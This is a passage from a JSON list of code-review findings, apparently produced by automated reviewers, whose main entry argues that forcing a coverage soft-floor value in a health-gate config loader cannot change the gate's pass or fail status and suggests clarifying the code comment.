    "confidence": "medium",
    "dedupe_key": "health-source-error-interpolated-into-durable-gate-reasons",
    "blocking_merge": false,
    "related_skill": "review-security-code",
    "learning_candidate": true
  },
  {
    "id": "F-006",
    "global_id": "T62#F-006",
    "reviewer": "review-logic (T62)",
    "severity": "info",
    "file": "src/health/config.ts",
    "line": 146,
    "symbol": "loadHealthConfig (present-unusable branch)",
    "problem": "T64 section 5 argues that leaving metrics.coverageSoftFloor at the default 'reopened the exact bug T59 closed, narrowed to this one field'. The premise about the field is right; the consequence is not reachable. The same branch forces gate.failOnRegressionDrop to 0, and computeGate escalates on regression >= config.gate.failOnRegressionDrop with regression defaulting to 0, so an unusable config produces 'FAIL: health regression 0 vs baseline' unconditionally, before coverage is read, and the gate is already fail. Forcing coverageSoftFloor to 100 therefore adds a WARN line to reasons and can never change status.",
    "impact": "None. The change is correct in direction and harmless; the argument recorded for it overstates what it buys, which is the failure mode this phase has flagged repeatedly (a sound rule with an unsound stated reason). It also means T64's acceptance row 'the verdicts themselves are unchanged' is true for a reason T64 does not give.",
    "suggested_fix": "State in the branch's comment that the forcing is defence in depth against a future change to failOnRegressionDrop, not a currently-reachable verdict change. Optionally note that nothing validates coverageSoftFloor, so the 'every legal value is <= 100' claim rests on convention rather than enforcement.",
    "evidence": "bun .metaproject/flows/233-2026-09-06-agent-first-core-phase-1/artifacts/T62-health.ts rows G20 (raw .metaproject/data/gdctx/raw/T62-health.log, sha256 ee63c9298bc92e1b6b632d324a5d7ab18e8c7b5c0a301b823272f2281ee9792a): all six unusable configs x four coverage values (absent, 41, 70, 100) yield status \"fail\" with 'FAIL: health regression 0 vs baseline' always present; the soft-floor WARN line appears at 41 and 70 and is absent at 100 and when coverage is absent, with status identical in all four. Row G40 shows a config declaring coverageSoftFloor 150 is accepted by the loader with no validation, and the forced config is still at least as strict at the status level for the same reason.",
    "confidence": "high",
    "dedupe_key": "health-coverage-softfloor-forcing-inert-under-its-own-branch",
    "blocking_merge": false,
    "related_skill": "gdskills/orchestration/task-implementer",
    "learning_candidate": false
  }
]
```
